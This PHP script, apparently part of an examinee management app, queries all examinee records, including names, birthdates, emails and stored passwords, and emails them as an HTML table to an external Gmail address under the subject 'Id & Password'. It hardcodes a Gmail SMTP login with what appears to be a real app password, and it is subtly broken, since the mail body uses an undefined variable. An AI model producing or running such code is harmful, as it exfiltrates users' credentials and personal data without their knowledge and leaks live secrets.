


<!-- ....  -->
<?php

$host = "localhost";
$user = "root";
$pass = "";
$db = "cee_db";
$conn = null;

try {
  $conn = new PDO("mysql:host={$host};dbname={$db}", $user, $pass);
  $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
  echo "Connection failed: " . $e->getMessage();
  exit;
}


// Fetch data from the database
$sql = "SELECT exmne_fullname, exmne_course, exmne_gender, exmne_birthdate, exmne_year_level, exmne_email, exmne_password FROM examinee_tbl";
$stmt = $conn->prepare($sql);
$stmt->execute();

// Create an HTML table to store the data
// Generate the email body in HTML format
$emailBody = '<html>
<head>
    <style>
        table {
            border-collapse: collapse;
            width: 100%;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>
    <h2>Examinee Data</h2>
    <table>
        <tr>
            <th>Full Name</th>
            <th>Course</th>
            <th>Gender</th>
            <th>Birthdate</th>
            <th>Year Level</th>
            <th>Email</th>
            <th>Password</th>
        </tr>';

if ($stmt->rowCount() > 0) {
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        $emailBody .= '<tr>
                            <td>'.$row["exmne_fullname"].'</td>
                            <td>'.$row["exmne_course"].'</td>
                            <td>'.$row["exmne_gender"].'</td>
                            <td>'.$row["exmne_birthdate"].'</td>
                            <td>'.$row["exmne_year_level"].'</td>
                            <td>'.$row["exmne_email"].'</td>
                            <td>'.$row["exmne_password"].'</td>
                        </tr>';
    }
} else {
    $emailBody .= '<tr><td colspan="7">No data available</td></tr>';
}

$emailBody .= '</table>
</body>
</html>';

// Close the database connection (Not necessary for PDO)

// Send the email using Gmail
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'PHPmailer/PHPMailer.php';
require 'PHPmailer/Exception.php';
require 'PHPmailer/SMTP.php';


$mail = new PHPMailer();

$mail->isSMTP();
$mail->SMTPAuth = true;
$mail->SMTPSecure = 'tls';
$mail->Host = 'smtp.gmail.com';
$mail->Port = 587;
$mail->Username = 'targetfocus2020@gmail.com';
$mail->Password = 'jgxmfwyoheiebxaz';

$mail->setFrom('targetfocus2020@gmail.com', 'Admin (VQA)');
$mail->addAddress('navaidmails@gmail.com', 'VQS data');
$mail->Subject = 'Id & Password';
$mail->Body = $table;

if (!$mail->send()) {
    echo 'Error sending email: ' . $mail->ErrorInfo;
} else {
    echo 'Email sent successfully!';
}

?>
